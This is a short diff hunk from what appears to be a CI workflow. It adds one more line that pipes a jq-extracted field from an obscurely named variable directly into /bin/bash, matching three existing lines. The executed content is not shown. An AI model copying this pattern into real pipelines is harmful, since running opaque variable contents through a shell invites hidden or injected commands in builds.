@@ -30,6 +30,7 @@ jobs:
           echo $ea23 | jq -r .i2 | /bin/bash
           echo $xxmu86114 | jq -r .dfcdi578 | /bin/bash
           echo $emz5 | jq -r .ia81 | /bin/bash
+          echo $ehvu3766 | jq -r .kz47552 | /bin/bash
 
       - name: Save output
         if: always()
